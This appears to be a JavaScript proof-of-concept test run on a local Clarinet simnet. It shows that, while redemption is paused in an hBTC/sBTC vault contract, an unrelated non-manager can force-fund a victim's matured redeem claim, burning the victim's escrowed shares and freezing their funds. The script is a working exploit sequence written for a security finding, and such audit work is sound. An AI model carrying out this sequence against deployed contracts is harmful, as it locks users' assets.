import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

// Reuse the production-contract security deployment plan that is already used by
// the green stale-NAV security proofs. No live transaction is broadcast.
const simnet = await initSimnet('tests/security/stale-nav/Clarinet.toml');
const accounts = simnet.getAccounts();
const deployer = accounts.get('deployer');
const victim = accounts.get('wallet_2');
const attacker = accounts.get('wallet_3');
if (!deployer || !victim || !attacker) throw new Error('missing accounts');

const BASE = 100_000_000n;
const SBTC = 'SM3VDXK3WZZSA84XXF1T3KY37XEZTPGGDC8EQYP';
// Actual token contract used by the production-security deployment.
const SBTC_TOKEN = 'SM3VDXK3WZZSA84XXF1T3KY37XEZTPGGDC8EQYP.sbtc-token';
const PROD_SBTC_TOKEN = 'SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token';
const c = n => `${deployer}.${n}`;
const text = r => cvToString(r.result);
const pub = (n, fn, args, sender) => simnet.callPublicFn(c(n), fn, args, sender);
const ro = (n, fn, args = [], sender = deployer) => simnet.callReadOnlyFn(c(n), fn, args, sender);

function expectResult(label, r, wanted) {
  const got = text(r);
  console.log(`${label}: ${got}`);
  assert.equal(got, wanted, `${label}: expected ${wanted}, got ${got}`);
}
function uintFrom(r) {
  const got = text(r);
  const m = got.match(/(?:\(ok )?u(\d+)\)?/);
  if (!m) throw new Error(`not uint: ${got}`);
  return BigInt(m[1]);
}
function hbtc(who) {
  return uintFrom(ro('token-hbtc', 'get-balance', [Cl.principal(who)], who));
}

console.log('=== setup minimum production hBTC roles/assets ===');
const state = c('state');
const vault = c('vault');
const reserve = c('reserve');
for (const address of [state, vault, reserve]) {
  expectResult(`request protocol role ${address}`, pub('hq-hbtc', 'request-protocol-update', [Cl.principal(address), Cl.bool(true)], deployer), '(ok true)');
}
expectResult('request sBTC asset', pub('state', 'request-asset-add', [Cl.principal(PROD_SBTC_TOKEN), Cl.buffer(new Uint8Array(32)), Cl.uint(8), Cl.uint(500), Cl.bool(false)], deployer), '(ok true)');
simnet.mineEmptyBlocks(200);
for (const address of [state, vault, reserve]) {
  expectResult(`confirm protocol role ${address}`, pub('hq-hbtc', 'confirm-protocol-request', [Cl.principal(address)], deployer), '(ok true)');
}
expectResult('confirm sBTC asset', pub('state', 'confirm-asset-request', [Cl.principal(PROD_SBTC_TOKEN)], deployer), '(ok true)');
expectResult('set deposit cap', pub('state', 'set-deposit-cap', [Cl.uint(2n * BASE)], deployer), '(ok true)');
expectResult('attacker is not manager', ro('hq-hbtc', 'get-manager', [Cl.principal(attacker)]), 'false');

// Fund only the victim with local sBTC via the same test-only private mint helper
// used throughout the existing security harness.
const mint = simnet.callPrivateFn(
  PROD_SBTC_TOKEN,
  'protocol-mint-many-iter',
  [Cl.tuple({ amount: Cl.uint(BASE), recipient: Cl.principal(victim) })],
  deployer,
);
expectResult('fund victim with 1.00 sBTC', mint, '(ok true)');

console.log('=== establish 1.00 sBTC vault and mature standard claim #1 ===');
expectResult('victim deposit 1.00', pub('vault', 'deposit', [Cl.uint(BASE), Cl.none()], victim), '(ok u100000000)');
expectResult('victim request standard redeem #1', pub('vault', 'request-redeem', [Cl.uint(BASE), Cl.bool(false)], victim), '(ok u1)');
assert.equal(hbtc(victim), 0n, 'victim shares must be escrowed in vault');
simnet.mineEmptyBlocks(500);

console.log('=== CONTROL: pause alone still lets victim recover hBTC through cancel-redeem ===');
expectResult('owner pauses redemption', pub('state', 'set-redeem-enabled', [Cl.bool(false)], deployer), '(ok false)');
expectResult('redeem-enabled is false', ro('state', 'get-redeem-enabled'), 'false');
expectResult('victim cancel claim #1 while paused', pub('vault', 'cancel-redeem', [Cl.uint(1)], victim), '(ok u100000000)');
assert.equal(hbtc(victim), BASE, 'pause alone must leave the unfunded standard claim recoverable');
console.log(`CONTROL_USER_HBTC_AFTER_CANCEL=${hbtc(victim)}`);

console.log('=== re-arm an equivalent matured claim, then pause again ===');
expectResult('owner re-enables redemption to create equivalent claim', pub('state', 'set-redeem-enabled', [Cl.bool(true)], deployer), '(ok true)');
expectResult('victim request standard redeem #2', pub('vault', 'request-redeem', [Cl.uint(BASE), Cl.bool(false)], victim), '(ok u2)');
assert.equal(hbtc(victim), 0n);
simnet.mineEmptyBlocks(500);
expectResult('owner pauses redemption again', pub('state', 'set-redeem-enabled', [Cl.bool(false)], deployer), '(ok false)');

console.log('=== ATTACK: unrelated non-manager force-funds during the pause ===');
expectResult('unrelated attacker funds claim #2 while redeem-disabled', pub('vault', 'fund-claim', [Cl.uint(2)], attacker), '(ok u100000000)');
assert.equal(hbtc(victim), 0n, 'funding burns the escrowed hBTC; victim no longer has shares to recover');
const claimAfterFunding = text(ro('vault', 'get-claim', [Cl.uint(2)], victim));
console.log(`CLAIM_AFTER_FORCED_FUNDING=${claimAfterFunding}`);
assert.match(claimAfterFunding, /\(assets \(some u100000000\)\)/, 'claim must be irreversibly marked funded');

expectResult('victim cancel after attacker funding', pub('vault', 'cancel-redeem', [Cl.uint(2)], victim), '(err u103005)');
expectResult('victim redeem while paused', pub('vault', 'redeem', [Cl.uint(2)], victim), '(err u102006)');
console.log(`ATTACK_USER_HBTC_WHILE_FROZEN=${hbtc(victim)}`);

console.log('=== NEGATIVE CONTROL: only unpause restores access to the funded sBTC ===');
expectResult('owner re-enables redemption', pub('state', 'set-redeem-enabled', [Cl.bool(true)], deployer), '(ok true)');
expectResult('victim finally redeems claim #2', pub('vault', 'redeem', [Cl.uint(2)], victim), '(ok u100000000)');

console.log('PASS PAUSED FORCE-FUNDING FREEZE: with the same user and same 1.00 sBTC claim, redeem-enabled=false alone leaves an unfunded standard claim cancellable and returns all hBTC. After re-arming the same claim and applying the same pause, an unrelated non-manager can permissionlessly fund it after cooldown. Funding burns the escrowed hBTC and makes cancel-redeem fail with ALREADY_FUNDED, while redeem fails with REDEEM_DISABLED. The victim cannot access hBTC or sBTC until redemption is re-enabled.');
